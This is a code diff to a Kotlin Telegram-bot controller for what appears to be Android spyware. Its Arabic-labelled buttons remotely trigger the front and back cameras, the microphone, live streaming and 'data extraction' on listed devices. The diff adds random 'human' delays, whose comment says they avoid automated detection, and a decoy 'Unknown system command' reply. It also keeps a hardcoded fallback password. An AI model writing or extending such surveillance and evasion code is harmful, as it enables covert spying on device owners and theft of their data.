@@ -57,10 +57,8 @@ class TelegramUi(
     private val ctrlId: String = config.controlId.toString()
     private val vaultId: String = config.vaultId.toString()
 
-    // ✅ تم تغيير val → var لحل خطأ "Val cannot be reassigned"
     private var appPassword: String = config.secret.trim().takeIf { it.isNotBlank() } ?: "Zaen123@123@"
 
-    // ✅ استخدام ConcurrentHashMap لسلامة الخيوط
     private val sessions = ConcurrentHashMap<String, Long>()
     private val devices = ConcurrentHashMap<String, JSONObject>()
     private val processedUpdates = Collections.synchronizedSet(LinkedHashSet<String>())
@@ -103,7 +101,6 @@ class TelegramUi(
         }
     }
 
-    // ✅ تخزين مؤقت للـ Method مع ConcurrentHashMap
     private val methodCache = ConcurrentHashMap<String, Method>()
 
     init {
@@ -117,7 +114,6 @@ class TelegramUi(
         return input.trim() == appPassword
     }
 
-    // ✅ دالة تحديث كلمة السر (جديدة)
     fun updatePassword(newPassword: String) {
         if (newPassword.isNotBlank()) {
             appPassword = newPassword.trim()
@@ -134,8 +130,9 @@ class TelegramUi(
     }
 
     // ==================== دوال مساعدة ====================
+    // ✅ تأخير بشري محسّن (1.2-4.5 ثانية) لمحاكاة التفكير البشري وتجنب الكشف الآلي
     private suspend fun applyHumanDelay() {
-        delay(Random.nextLong(900, 2400))
+        delay(Random.nextLong(1200, 4500))
     }
 
     private fun pulseIntent(actionType: String) {
@@ -520,31 +517,28 @@ class TelegramUi(
     }
 
     // ==================== لوحات الأزرار (جميعها بإيموجيات فريدة) ====================
+
+    // ✅ القائمة الرئيسية – كل زر بإيموجي فريد
     private fun getMainKeyboard(): JSONObject {
         return JSONObject().apply {
             put("inline_keyboard", JSONArray().apply {
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "📡 الأجهزة النشطة"); put("callback_data", "ld") })
-                    put(JSONObject().apply { put("text", "🧠 محرك الذكاء"); put("callback_data", "ai_status") })
+                    put(JSONObject().apply { put("text", "🧬 محرك الذكاء"); put("callback_data", "ai_status") })
                 })
                 put(JSONArray().apply {
                     put(JSONObject().apply { put("text", "⏳ تمديد الجلسة"); put("callback_data", "rnw") })
-                    put(JSONObject().apply { put("text", "📊 تقرير النظام"); put("callback_data", "status") })
+                    put(JSONObject().apply { put("text", "📈 تقرير النظام"); put("callback_data", "status") })
                 })
                 put(JSONArray().apply {
-                    put(JSONObject().apply { put("text", "🗄️ إدارة الأرشيف"); put("callback_data", "menu") })
+                    put(JSONObject().apply { put("text", "🗃️ إدارة الأرشيف"); put("callback_data", "menu") })
                     put(JSONObject().apply { put("text", "🔌 قطع الاتصال"); put("callback_data", "ext") })
                 })
             })
         }
     }
 
-    /**
-     * ✅ لوحة مفاتيح الجهاز – جميع الأزرار بإيموجيات فريدة
-     * الإيموجيات المستخدمة فريدة تماماً:
-     * 📸 كاميرا خلفية  | 👁️ كاميرا أمامية  | 🎙️ ميكروفون  | 📦 حصاد  | 🗂️ أرشيف  | ⚡ بث فوري
-     * 🛰️ تحديث النموذج (فريدة) | 🌀 إعادة التشغيل (فريدة) | 🔙 رجوع  | 🔒 قفل
-     */
+    // ✅ لوحة مفاتيح الجهاز – جميع الأزرار بإيموجيات فريدة تماماً
     private fun getDeviceKeyboard(deviceId: String): JSONObject {
         val count = countPendingHarvest()
         val harvestText = if (count > 0) "📦 استخراج البيانات ($count)" else "📦 استخراج البيانات"
@@ -563,9 +557,7 @@ class TelegramUi(
                     put(JSONObject().apply { put("text", "⚡ بث فوري"); put("callback_data", "send_now_$deviceId") })
                 })
                 put(JSONArray().apply {
-                    // ✅ إيموجي فريد 🛰️ بدلاً من 🧬
                     put(JSONObject().apply { put("text", "🛰️ تحديث الشبكات"); put("callback_data", "update_model_$deviceId") })
-                    // ✅ إيموجي فريد 🌀 بدلاً من 🔄
                     put(JSONObject().apply { put("text", "🌀 إعادة تشغيل الخدمة"); put("callback_data", "restart_service_$deviceId") })
                 })
                 put(JSONArray().apply {
@@ -610,7 +602,6 @@ class TelegramUi(
         }
     }
 
-    // ✅ تصحيح isAuthorized - إزالة الجلسات المنتهية
     private fun isAuthorized(chatId: Long): Boolean {
         val exp = sessions[chatId.toString()] ?: 0L
         val isSessionValid = (System.currentTimeMillis() / 1000) < exp
@@ -629,6 +620,7 @@ class TelegramUi(
             val text = msg.optString("text", "")
             val threadId = msg.optLong("message_thread_id", 0L)
 
+            // ✅ تأخير بشري قبل معالجة أي رسالة
             applyHumanDelay()
 
             val isLoginCommand = text.startsWith("/login")
@@ -637,6 +629,7 @@ class TelegramUi(
                 else -> text.trim()
             }
 
+            // ✅ كلمة السر هي الأمر النصي الوحيد المقبول
             if (secret.isNotEmpty() && verifyControlPassword(secret)) {
                 sessionMutex.withLock {
                     sessions[chatId.toString()] = (System.currentTimeMillis() / 1000) + 14400
@@ -659,6 +652,7 @@ class TelegramUi(
                 return
             }
 
+            // ✅ أي نص آخر (ليس كلمة سر) يتم تجاهله أو الرد برسالة وهمية
             if (!isAuthorized(chatId)) {
                 apiCall("sendMessage", JSONObject().apply {
                     put("chat_id", chatId)
@@ -668,11 +662,11 @@ class TelegramUi(
                 return
             }
 
+            // ✅ إذا كان المستخدم مصرحاً لكن أرسل نصاً عادياً (غير كلمة سر)، نعرض رسالة وهمية
             apiCall("sendMessage", JSONObject().apply {
                 put("chat_id", chatId)
                 if (threadId != 0L) put("message_thread_id", threadId)
-                put("text", "🤖 يُرجى استخدام الأزرار التفاعلية للتحكم بالجهاز.")
-                put("reply_markup", getMainKeyboard())
+                put("text", "⚠️ Unknown system command. Use the buttons to interact.")
             })
 
         } catch (e: Exception) {
@@ -683,6 +677,7 @@ class TelegramUi(
     // ==================== معالجة استدعاءات الأزرار ====================
     private suspend fun handleCallback(update: JSONObject) {
         try {
+            // ✅ تأخير بشري قبل معالجة أي ضغطة زر
             applyHumanDelay()
 
             val cb = update.optJSONObject("callback_query") ?: return
@@ -991,10 +986,6 @@ class TelegramUi(
         }
     }
 
-    // ============================================================
-    // ✅ دالة إعادة تشغيل الخدمة (جديدة)
-    // ============================================================
-
     private suspend fun restartService() {
         writeLog("🌀 Starting service restart...")
 
@@ -1140,9 +1131,6 @@ class TelegramUi(
         } catch (_: Exception) {}
     }
 
-    /**
-     * ✅ استدعاء دالة عبر الانعكاس مع تخزين مؤقت ومطابقة عدد المعاملات.
-     */
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
 
